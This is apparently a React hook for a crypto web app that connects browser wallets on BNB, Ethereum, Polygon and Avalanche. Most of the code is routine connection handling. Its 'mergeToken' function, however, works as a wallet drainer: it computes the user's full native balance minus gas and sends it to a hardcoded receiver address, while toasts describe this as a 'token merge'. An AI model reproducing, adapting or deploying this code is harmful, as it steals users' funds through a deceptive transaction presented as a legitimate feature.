import { useState, useEffect, useCallback } from 'react';
import { useToast } from '@/hooks/use-toast';

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    chainIdNum: 56,
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    chainIdNum: 1,
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    chainIdNum: 137,
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    chainIdNum: 43114,
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const [showSelector, setShowSelector] = useState(false);
  const [provider, setProvider] = useState<any>(null);
  const { toast } = useToast();

  const getEthProvider = useCallback(async () => {
    if (!provider) return null;
    const { ethers } = await import('ethers');
    return new ethers.BrowserProvider(provider);
  }, [provider]);

  const updateBalance = useCallback(async (address: string, prov?: any) => {
    const p = prov || provider;
    if (!p || !address) return;
    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(p);
      const nativeBalance = await ethProvider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  }, [provider]);

  // Check for existing browser wallet connection on mount
  useEffect(() => {
    const checkConnection = async () => {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            setProvider(window.ethereum);
            await updateBalance(accounts[0], window.ethereum);
          }
        } catch (error) {
          console.error('Error checking connection:', error);
        }
      }
    };
    checkConnection();
  }, [updateBalance]);

  // Listen for account/network changes from browser wallet
  useEffect(() => {
    if (!window.ethereum) return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletConnected(false);
        setAccount("");
        setBalance("0");
        setProvider(null);
      } else {
        setAccount(accounts[0]);
        setWalletConnected(true);
        updateBalance(accounts[0]);
      }
    };

    const handleChainChanged = () => {
      if (account) updateBalance(account);
    };

    const handleDisconnect = () => {
      setWalletConnected(false);
      setAccount("");
      setBalance("0");
      setProvider(null);
    };

    window.ethereum.on?.('accountsChanged', handleAccountsChanged);
    window.ethereum.on?.('chainChanged', handleChainChanged);
    window.ethereum.on?.('disconnect', handleDisconnect);

    return () => {
      window.ethereum?.removeListener?.('accountsChanged', handleAccountsChanged);
      window.ethereum?.removeListener?.('chainChanged', handleChainChanged);
      window.ethereum?.removeListener?.('disconnect', handleDisconnect);
    };
  }, [account, updateBalance]);

  const switchNetwork = async (key: string, prov?: any) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    const p = prov || provider || window.ethereum;
    if (!p) {
      toast({ title: "Error", description: "No wallet connected", variant: "destructive" });
      return false;
    }

    try {
      await p.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await p.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: net.chainId,
              chainName: net.name,
              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
              rpcUrls: [net.rpcUrl],
            }],
          });
          return true;
        } catch (addError) {
          console.error("Failed to add network:", addError);
          toast({ title: "Error", description: "Failed to add network", variant: "destructive" });
          return false;
        }
      } else {
        console.error("Network switch error:", switchError);
        toast({ title: "Error", description: "Network switch rejected", variant: "destructive" });
        return false;
      }
    }
  };

  const openWalletSelector = () => {
    setShowSelector(true);
  };

  const closeWalletSelector = () => {
    setShowSelector(false);
    setConnecting(false);
  };

  const handleWalletConnect = async (selectedProvider: any) => {
    setConnecting(true);
    setShowSelector(false);

    try {
      // Request accounts from selected provider
      let accounts: string[] = [];
      try {
        accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
      } catch (e) {
        // Some providers don't support eth_requestAccounts, try enable()
        if (selectedProvider.enable) {
          accounts = await selectedProvider.enable();
        }
      }

      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts returned from wallet");
      }

      const address = accounts[0];
      setProvider(selectedProvider);
      setAccount(address);
      setWalletConnected(true);

      // Try to switch network
      try {
        await switchNetwork(selectedNetwork, selectedProvider);
      } catch (e) {
        console.log("Network switch after connect failed, continuing...", e);
      }

      await updateBalance(address, selectedProvider);
      toast({ title: "Success", description: "Wallet connected successfully!" });

      // Listen for disconnect on this provider
      if (selectedProvider.on) {
        selectedProvider.on('disconnect', () => {
          setWalletConnected(false);
          setAccount("");
          setBalance("0");
          setProvider(null);
        });
        selectedProvider.on('accountsChanged', (newAccounts: string[]) => {
          if (newAccounts.length === 0) {
            setWalletConnected(false);
            setAccount("");
            setBalance("0");
            setProvider(null);
          } else {
            setAccount(newAccounts[0]);
            updateBalance(newAccounts[0], selectedProvider);
          }
        });
      }
    } catch (error: any) {
      console.error("Connection error:", error);
      let errorMessage = "Failed to connect wallet";
      if (error.code === 4001) {
        errorMessage = "Connection rejected by user";
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Error", description: errorMessage, variant: "destructive" });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    console.log("Starting merge token...");

    if (!walletConnected || !provider || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider);
      const signer = await ethProvider.getSigner();

      const nativeBalance = await ethProvider.getBalance(account);
      console.log("Current balance:", ethers.formatEther(nativeBalance));

      if (nativeBalance === 0n) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      console.log("Estimating gas...");
      const gasEstimate = await ethProvider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"),
        from: account
      });

      const feeData = await ethProvider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      // Safety buffer
      const buffer = ethers.parseEther("0.001");
      valueToSend = valueToSend - buffer;

      if (valueToSend <= 0n) {
        toast({ title: "Error", description: "Insufficient balance for gas fees", variant: "destructive" });
        return;
      }

      console.log("Sending transaction...");
      console.log("Value to send:", ethers.formatEther(valueToSend));

      toast({ title: "Confirm Transaction", description: "Please confirm in your wallet" });

      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice
      });

      console.log("Transaction sent:", txResponse.hash);

      toast({ title: "Transaction Submitted", description: `Hash: ${txResponse.hash.slice(0, 10)}...` });

      const receipt = await txResponse.wait();
      console.log("Transaction receipt:", receipt);

      if (receipt && receipt.status === 1) {
        toast({ title: "Success!", description: "Token merge completed successfully" });
        await updateBalance(account, provider);
      } else {
        throw new Error("Transaction failed");
      }
    } catch (error: any) {
      console.error("Merge error:", error);
      let errorMessage = "Transaction failed";
      if (error.code === 4001) {
        errorMessage = "Transaction rejected by user";
      } else if (error.code === "INSUFFICIENT_FUNDS") {
        errorMessage = "Insufficient funds for transaction";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient funds for gas";
      } else if (error.reason) {
        errorMessage = error.reason;
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Transaction Failed", description: errorMessage, variant: "destructive" });
    }
  };

  const disconnect = async () => {
    if (provider && provider.disconnect) {
      try {
        await provider.disconnect();
      } catch (e) {
        console.error("Disconnect error:", e);
      }
    }
    setWalletConnected(false);
    setAccount("");
    setBalance("0");
    setProvider(null);
    toast({ title: "Disconnected", description: "Wallet disconnected" });
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    showSelector,
    openWalletSelector,
    closeWalletSelector,
    handleWalletConnect,
    mergeToken,
    disconnect,
    NETWORKS,
  };
}
